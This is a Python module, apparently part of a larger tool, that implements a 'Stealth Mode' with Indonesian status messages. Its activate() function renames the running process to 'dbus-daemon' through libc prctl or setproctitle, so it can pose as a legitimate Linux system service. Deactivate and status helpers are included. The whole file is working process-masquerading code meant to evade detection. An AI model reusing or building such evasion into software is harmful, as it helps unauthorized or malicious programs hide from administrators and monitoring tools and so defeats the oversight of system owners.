"""
Stealth Mode — process hiding, name masquerading, silent operation.
"""
import os
import sys
import platform
from loguru import logger

_stealth_active = False
_original_proctitle = ""
_masquerade_name = "dbus-daemon"


def _set_process_name(name: str):
    try:
        import ctypes
        libc = ctypes.CDLL("libc.so.6")
        libc.prctl(15, name.encode(), 0, 0, 0)
        return True
    except Exception:
        pass
    try:
        import setproctitle
        setproctitle.setproctitle(name)
        return True
    except ImportError:
        pass
    return False


def activate():
    global _stealth_active, _original_proctitle
    if _stealth_active:
        return "Stealth sudah aktif."

    _original_proctitle = sys.argv[0] if sys.argv else "python"

    ok = _set_process_name(_masquerade_name)
    if ok:
        logger.info(f"Process name set to '{_masquerade_name}'")
    else:
        logger.warning("Could not set process name (setproctitle not available)")

    _stealth_active = True
    return f"Stealth mode AKTIF. Process: {_masquerade_name}"


def deactivate():
    global _stealth_active
    if not _stealth_active:
        return "Stealth tidak aktif."

    _set_process_name(_original_proctitle)
    _stealth_active = False
    return "Stealth mode DIMATIKAN."


def status():
    if _stealth_active:
        return f"Stealth: AKTIF (masquerading as '{_masquerade_name}')"
    return "Stealth: TIDAK AKTIF"
